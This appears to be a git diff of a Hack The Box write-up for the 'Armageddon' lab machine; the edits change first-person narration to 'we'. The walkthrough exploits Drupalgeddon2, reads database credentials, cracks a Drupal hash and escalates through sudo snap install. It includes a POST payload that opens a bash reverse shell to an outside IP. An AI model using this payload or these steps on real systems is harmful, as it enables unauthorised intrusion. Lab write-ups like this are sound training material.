@@ -6,7 +6,7 @@ tags: [HTB]
 featuredImage: "/images/2021/07/Armageddon_Logo.png"
 ---
 ## Intro
-During this box, I'll exploit an outdated version of Drupal in order to get an initial shell. This will allow me to discover user credentials on the Drupal DB. Finally, I'll get privesc thanks to an insecure sudo command (once again).
+During this box, we'll exploit an outdated version of Drupal in order to get an initial shell. This will allow me to discover user credentials on the Drupal DB. Finally, I'll get privesc thanks to an insecure sudo command (once again).
 
 ## Target
 [HTB - Armageddon](https://app.hackthebox.eu/machines/323)
@@ -47,33 +47,33 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 10.48 seconds
 ```
 
-The above scans confirms I am facing a Linux box with only Apache and SSH running. 
+The above scans confirms we are facing a Linux box with only Apache and SSH running. 
 
 The `CHANGELOG.txt` shows a `Drupal 7.56` version :
 
 ![Drupal Version](/images/2021/07/Armageddon_Drupal_Version.png)
 
-After a quick look on [exploitDB](https://www.exploit-db.com/), I notice that this version should be vulnerable to `Drupalgeddon2`.
+After a quick look on [exploitDB](https://www.exploit-db.com/), we'll notice that this version should be vulnerable to `Drupalgeddon2`.
 
 Let's see!
 
 ## Exploitation
-I like to use searchsploit directly in my terminal, it makes it easier to show an exploit with `searchsploit -x relative_path` and `searchsploit -m relative_path` in order to mirror (eg. copy the exploit in my current directory).
+NB: I like to use searchsploit directly in my terminal, it makes it easier to show an exploit with `searchsploit -x relative_path` and `searchsploit -m relative_path` in order to mirror (eg. copy the exploit in my current directory).
 
-In my case, I'll by using : `searchsploit -m php/webapps/44449.rb`.
+In our case, we'll be using : `searchsploit -m php/webapps/44449.rb`.
 
 ### Getting Initial Shell
-After firing it up, I'll get a shell :
+After firing it up, we'll get a shell :
 
 ![Initial Shell](/images/2021/07/Armageddon_Initial_Shell.png)
 
-From here, I can get the Drupal config inside `sites/default/settings.php` and find `MySQL credentials` :
+From here, we can get the Drupal config inside `sites/default/settings.php` and find `MySQL credentials` :
 
 ![MySQL Credentials](/images/2021/07/Armageddon_Mysql_Creds.png)
 
-Once, I had the creds, I tried to dump the db, with `mysqldump`, but got an error about a bad character (>). This is when I decided to upgrade my shell.
+Once, we have the creds, we can try to dump the db, with `mysqldump`, but we'll gt an error about a bad character (>). We,then, shall upgrade our shell.
 
-I fired up `Burp`, with the following request and a `nc listener` :
+Let's fire up `Burp`, with the following request and a `nc listener` :
 
 ```text
 POST /shell.php HTTP/1.1
@@ -93,17 +93,17 @@ Content-Length: 46
 c=bash+-i+>%26+/dev/tcp/10.10.14.11/443+0>%261
 ```
 
-In case you are wondering, I am using the `shell.php` from the exploit, and I simply copy pasted the URL in browser, captured it with Burp, and converted to POST. Then, I could run a better script.
+NB : In case you are wondering, I am using the `shell.php` from the exploit, and I simply copy pasted the URL in browser, captured it with Burp, and converted to POST. Then, I could run a better script.
 
-Once it was done, I could dump the DB like so :
+Once it is done, we can dump the DB like so :
 
 `mysqldump -u drupaluser -p drupal > plop.sql`
 
-I then looked inside the dump and looked for user's information :
+We now look inside the dump and search for user's information :
 
 ![User Info](/images/2021/07/Armageddon_Dump.png)
 
-It appears our user is called `brucetherealadmin` and it's hash starts with `$S$` according to [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes), it is a Drupal 7 hash, which I can confirm it is!
+It appears our user is called `brucetherealadmin` and it's hash starts with `$S$` according to [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes), it is a Drupal 7 hash, which we can confirm it is!
 
 Now to crack it :
 
@@ -128,9 +128,9 @@ Bruce can indeed run `sudo snap install` :
 
 When I first did the box, there was nothing on [GTFObins](https://gtfobins.github.io/), but since there is today, let's do it the easy way!
 
-I simply modified the first line with, replacing `id` command with `cat /root/root.txt`. 
+We simply modify the first line, replacing `id` command with `cat /root/root.txt`. 
 
-Finally, run it like : `sudo snap install plop_1.0_all.snap --dangerous --devmode` in order to get root's flag:
+Finally, we run it like : `sudo snap install plop_1.0_all.snap --dangerous --devmode` in order to get root's flag:
 
 ![Root Flag](/images/2021/07/Armageddon_Root_Flag.png)
 
